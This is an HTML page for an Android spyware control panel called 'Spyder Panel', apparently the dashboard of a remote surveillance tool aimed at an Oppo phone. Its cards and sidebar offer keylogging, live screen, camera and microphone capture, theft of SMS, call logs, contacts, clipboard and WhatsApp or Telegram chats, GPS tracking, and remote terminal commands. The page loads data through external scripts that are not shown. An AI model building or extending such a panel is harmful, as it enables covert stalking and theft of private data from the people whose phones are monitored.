<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Remote Control Admin Panel</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"/>
  <link rel="stylesheet" href="style.css">
  <!-- Leaflet CSS -->
<link
  rel="stylesheet"
  href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
/>
<!-- Leaflet JS -->
<script
  src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js">
</script>
<!-- Leaflet CSS -->

</head>

<body>
<script type="module" src="logout.js"></script>
  
  <!-- Sidebar -->
  <div class="sidebar fade-in">
    <h4>Spyder Panel</h4>
    <a href="#">Dashboard</a>
    <a href="#">Keylogger</a>
    <a href="#">Live Screen Monitoring</a>
    <a href="#">SMS Logs</a>
    <a href="#">Call Logs</a>
    <a href="#" id="trackLocation">Location</a>
    <a href="#">Battery Info</a>
    <a href="#">Device Status</a>
    <a href="#">Camera</a>
    <a href="#">Microphone</a>
    <a href="#">Gallery</a>
    <a href="#">Remote Commands</a>
    <a href="#">File Manager</a>
    <a href="#">Instant Messaging</a>
    <a href="#">App Monitor</a>
    <a href="#">Geo-Fencing</a>
    <a href="#">Clipboard Logs</a>
    <a href="#">App Lock</a>

  </div>

  <!-- Main Content -->
 <div class="main-content fade-in">

 <div class="index">

   <nav class="navbar navbar-expand-lg margin">
    <div class="container-fluid"><!--Here container fluid from that all behave like display:flex; and justify-content: space-evenly In think is direct from script code so if there any problem in future remove and make a new class replace container-fluid -->
      <a class="navbar-brand" href="#">Remote Control Spyder Panel</a>
      <button id="refreshSiteBtn"><i class="fa-solid fa-arrows-rotate"></i></button>
      <button id="logoutBtn" class="btn btn-sm btn-danger">Logout</button>
    </div>
  </nav>

  <div class="header d-flex justify-content-between align-items-center margin">
    <div>
      <h5>Device: <span class="text-info">Oppo K1</span></h5>
      <h6>
        Status: <span id="deviceStatus" class="status-green online">Executing..</span> |
        Battery: <span id="batteryLevel" class="text-warning">--%</span> |
        Last Seen: <span id="lastSeen" class="status-green">Executing..</span> |
      </h6>
    </div>
  </div>

 </div>

   <div class="container dashboard">
      <!-- Dashboard Section -->
      <fieldset>
        <legend>Dashboard</legend>
        <div class="row g-4">

          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-wifi"></i> Device Status</div>
              <p>Monitor signal strength and connectivity.</p>
              <button class="btn btn-outline-info btn-sm">Ping</button>
            </div>
          </div>

          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-battery-three-quarters"></i> Battery Info</div>
              <p>Check battery level and charging state.</p>
              <button class="btn btn-outline-info btn-sm">Refresh</button>
            </div>
          </div>

          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-sms"></i> SMS Logs</div>
              <p>View sent and received SMS messages.</p>
             <button class="btn btn-outline-info btn-sm" id="smsBtn">Open</button>
            </div>
          </div>

          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-phone"></i> Call Logs</div>
              <p>View incoming and outgoing call history.</p>
              <button id="btnCallLogs" class="btn btn-outline-info btn-sm">Open</button>
            </div>
          </div>

          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-calendar-alt"></i> Contact Log</div>
              <p>Access scheduled events, meetings & notes.</p>
              <button id="btnContacts" class="btn btn-outline-primary btn-sm">View Contact</button>
            </div>
          </div>

          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-chart-bar"></i> Statistics</div>
              <p>Analyze usage and interaction stats.</p>
              <button class="btn btn-outline-info btn-sm">Open</button>
            </div>
          </div>

        </div>
      </fieldset>

      <!--Middle feature-->
      <fieldset>
        <legend>General</legend>
        <div class="row g-4">

          

          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-image"></i> Gallery</div>
              <p>View and download images/videos.</p>
              <button class="btn btn-outline-success btn-sm">Open Gallery</button>
            </div>
          </div>

           <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-keyboard"></i> Keylogger</div>
              <p>Log and track keyboard input.</p>
              <button class="btn btn-outline-danger btn-sm">View Logs</button>
            </div>
          </div>

           <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-folder-open"></i> File Explorer</div>
              <p>Browse all files on the device.</p>
              <button class="btn btn-outline-secondary btn-sm">Browse Files</button>
            </div>
          </div>

          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-camera-retro"></i> Screenshot</div>
              <p>Take and view screenshots remotely.</p>
              <button class="btn btn-outline-info btn-sm">Capture</button>
            </div>
          </div>

          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-globe"></i> Site Web</div>
              <p>Monitor web activity & history.</p>
              <button class="btn btn-outline-info btn-sm">View</button>
            </div>
          </div>

          <div class="col-md-4">
      <div class="card fade-in">
        <div class="card-title"><i class="fas fa-map-marked-alt"></i> Travel History</div>
        <p>View previous travel routes of the device using location history.</p>
        <button class="btn btn-outline-warning btn-sm">Show Routes</button>
      </div>
    </div>

        </div>
      </fieldset>

      <!-- Other Features Section -->
      <fieldset>
        <legend>Other Features</legend>
        <div class="row g-4">

          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-history"></i> Clipboard History</div>
              <p>Track and view recent copied content on device.</p>
              <button class="btn btn-outline-light btn-sm">View Clipboard</button>
            </div>
          </div>
         
          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-bell-slash"></i> Do Not Disturb</div>
              <p>Remotely enable/disable DND or silent mode.</p>
              <button class="btn btn-outline-danger btn-sm">Toggle DND</button>
            </div>
          </div>

          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-user-clock"></i> App Scheduler</div>
                <p>Schedule apps to run or auto-close at set times.</p>
                <button class="btn btn-outline-warning btn-sm">Set Schedule</button>
              </div>
          </div>

           <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-folder-open"></i> Installed app</div>
              <p>Browse all files on the device.</p>
              <button class="btn btn-outline-secondary btn-sm" id="btnInstalledApps">Installed app</button>
            </div>
          </div>

      </div>
    </fieldset>

      <!-- Advanced Intelligence Features -->
<fieldset>
  <legend>Advanced Intelligence</legend>
  <div class="row g-4">

    <div class="col-md-4">
      <div class="card fade-in">
        <div class="card-title"><i class="fas fa-robot"></i> App Usage Monitor</div>
        <p>Track which apps are being used in real-time and duration.</p>
        <button class="btn btn-outline-info btn-sm">Monitor Apps</button>
      </div>
    </div>

    <div class="col-md-4">
      <div class="card fade-in">
        <div class="card-title"><i class="fas fa-envelope-open-text"></i> Instant Messaging</div>
        <p>Read WhatsApp, Messenger, Telegram (root/permission-based).</p>
        <button class="btn btn-outline-success btn-sm">Read Chats</button>
      </div>
    </div>
    

    <div class="col-md-4">
      <div class="card fade-in">
        <div class="card-title"><i class="fas fa-route"></i> Geo-Fencing</div>
        <p>Get alerts when device exits or enters a location.</p>
        <button class="btn btn-outline-info btn-sm">Set Fence</button>
      </div>
    </div>

    <div class="col-md-4">
      <div class="card fade-in">
        <div class="card-title"><i class="fas fa-bullhorn"></i> Alert Broadcast</div>
        <p>Push voice/sound alerts to the device remotely.</p>
        <button class="btn btn-outline-success btn-sm">Send Alert</button>
      </div>
    </div>

    <div class="col-md-4">
      <div class="card fade-in">
        <div class="card-title"><i class="fas fa-shield-alt"></i> App Lock</div>
        <p>Lock apps like gallery or messaging remotely.</p>
        <button class="btn btn-outline-info btn-sm">Manage Locks</button>
      </div>
    </div>

    
    
          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-map-marker-alt"></i> Location</div>
              <p>Live GPS tracking and location history.</p>
              <button id="trackLocation" class="btn btn-outline-info btn-sm">Track</button>
            </div>
          </div>

    

          <div class="col-md-4">
           <div class="card fade-in">
             <div class="card-title"><i class="fas fa-microphone"></i> Microphone</div>
             <p>Stream or record live audio.</p>
             <button class="btn btn-outline-warning btn-sm">Start Mic</button>
            </div>
          </div>

           <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-camera"></i> Camera Access</div>
              <p>Capture images or start live video.</p>
              <button class="btn btn-outline-danger btn-sm">Access Camera</button>
            </div>
          </div>

          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-terminal"></i> Remote Commands</div>
              <p>Execute terminal/ADB commands.</p>
              <button class="btn btn-outline-light btn-sm">Send Command</button>
            </div>
          </div>

          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fas fa-desktop"></i> Live Screen Monitoring</div>
              <p>Monitor the device screen live.</p>
              <button class="btn btn-outline-primary btn-sm">Start Stream</button>
            </div>
          </div>

          <div class="col-md-4">
            <div class="card fade-in">
              <div class="card-title"><i class="fa-solid fa-spider"></i> Spyder</div>
              <p>Remote trap</p>
              <button class="btn btn-outline-danger btn-sm">Cast-Net</button>
            </div>
          </div>

        </div>

  </div>
</fieldset>


    </div>
  </div>
<!-- SMS Logs Section -->
<div class="container mt-4" id="smsLogs">
  <h4>📩 SMS Logs</h4>
  <span class="crossLocation" title="Close">✖</span>
  <div class="table-responsive">
    <table class="table table-bordered table-striped">
      <thead>
       <tr>
         <th>Sender</th>
         <th>Message</th>
         <th>Time</th>
        </tr>
     </thead>
      <tbody id="smsTableBody">
        <!-- Rows will load here -->
      </tbody>
    </table>              
  </div>
</div>


<!--tracker-->
<div id="status" class="deviceStatus">
  <div class="map-in">
     <h4 class="livelocation">Live location</h4>
     <div id="map" class="map-main"></div>
     <p><strong>Exact Area:</strong> <span id="locationInfo">Fetching...</span></p>
  </div>
   <span class="crossLocation" title="Close">✖</span>
</div>

<!-- Installed Apps -->
<div class="container mt-4 allPages" id="installedApps" style="display:none;">
  <h4>📦 Installed Apps</h4>
  <span class="crossLocation" title="Close">✖</span>
  <div class="table-responsive">
    <table class="table table-bordered table-striped">
      <thead><tr><th>Name</th><th>Package</th></tr></thead>
      <tbody id="appsTableBody"></tbody>
    </table>
  </div>
</div>

<!-- Call Logs -->
<div class="container mt-4 allPages" id="callLogs">
  <h4>📞 Call Logs</h4>
  <span class="crossLocation" title="Close">✖</span>
  <div class="table-responsive">
    <table class="table table-bordered table-striped">
      <thead><tr><th>Name</th><th>Number</th><th>Type</th><th>Duration</th><th>Time</th></tr></thead>
      <tbody id="callTableBody"></tbody>
    </table>
  </div>
</div>

<!-- Contacts -->
<div class="container mt-4 allPages" id="contactLogs">
  <h4>👤 Contact Logs</h4>
  <span class="crossLocation" title="Close">✖</span>
  <div class="table-responsive">
    <table class="table table-bordered table-striped">
      <thead><tr><th>Name</th><th>Number</th></tr></thead>
      <tbody id="contactTableBody"></tbody>
    </table>
  </div>
</div>


<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<!-- <script type="module" src="smsscript.js"></script> -->
<script type="module" src="script.js" defer></script>
</body>
</html>
